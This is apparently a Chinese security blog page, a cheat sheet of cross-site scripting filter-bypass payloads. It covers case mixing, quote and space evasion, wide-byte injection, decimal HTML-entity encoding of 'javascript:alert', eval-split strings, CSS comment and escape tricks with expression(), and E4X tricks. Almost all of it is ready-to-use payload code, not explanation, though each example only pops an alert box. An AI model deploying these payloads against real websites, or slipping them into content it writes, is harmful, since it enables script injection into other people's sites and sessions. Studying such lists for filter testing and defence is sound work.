---
layout: default
---
# ![](../img/hj.jpg)XSS绕过过滤

## ![](../img/github5.png)转换大小写
```
<IMg SrC="jAvascriPt:alert('XSS');">
```
## ![](../img/github6.png)不用双引号
```
<img src='javascript:alert(0);'>
```
## ![](../img/github7.png)不用引号
```
<img src=javascript:alert(0);>
```
## ![](../img/github8.png)/代替空格
```
<img/src='javascript:alert("XSS");'>
```
## ![](../img/github9.png)宽字节注入
```
%c0%22;alert(1);
```
## ![](../img/github10.png)利用字符编码
十进制形式：
```
&#106&#97或&#106、&#97、或&#106;、&#97;、
或&#0106&#097或&#00106&#0097或&#000106&#00097
```
javascript:alert('XSS')十进制为：
```
（用hackerbar的XSS的HTML Characters可自动转换）
&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#39&#88&#83&#83&#39&#41&#59
```
exploit：
```
<img src="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#39&#88&#83&#83&#39&#41&#59">
```
## ![](../img/github11.png)拆分跨站法
针对表格长度限制,通过变量:z=z+'..'   最后eval(z)
## ![](../img/github12.png)样式表中插入/**/注释或\\或\\0或转码
在样式表中这三个都会被浏览器忽略，/**/在正常js中也可以用
```
<img scr=''javas/*/*javascript*/script*/cript:alert('xss');''>
<div style="wi/*XSS*/dth:exp/*XSS*/ression(alert('XSS'));">
<div style="wi\dth:exp\0ression(alert('XSS'));">
<div style="width:\65xpression(alert('XSS'));">
<div style="width:\065xpression(alert('XSS'));">
<div style="width:\0065xpression(alert('XSS'));">
```
## ![](../img/github13.png)利用E4X
```
<script>
foo=<foo><id name="thx">x</id></foo>;		//注意，x没有引号包围
alert(foo.id.@name);										//访问属性用@符号，id可以省略直接如下：
alert(foo..@name);											//不过这个就不知道获得哪个节点的属性了
```
更进一步：
```
alert(<foo>hi</foo>);									//弹出hi，继续缩短代码，如下：
alert(<>hi</>);												//也弹出hi，注意hi没引号
</script>
```
这样就可以考虑把脚本放到XML数据中，如：
```
x=<>alert('hello')</>
//这句是无法自执行的，加个花括号就可以自执行了：
x=<>{alert('hello')}</>
eval(x+[])						//注意中括号[]不可少
```


__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
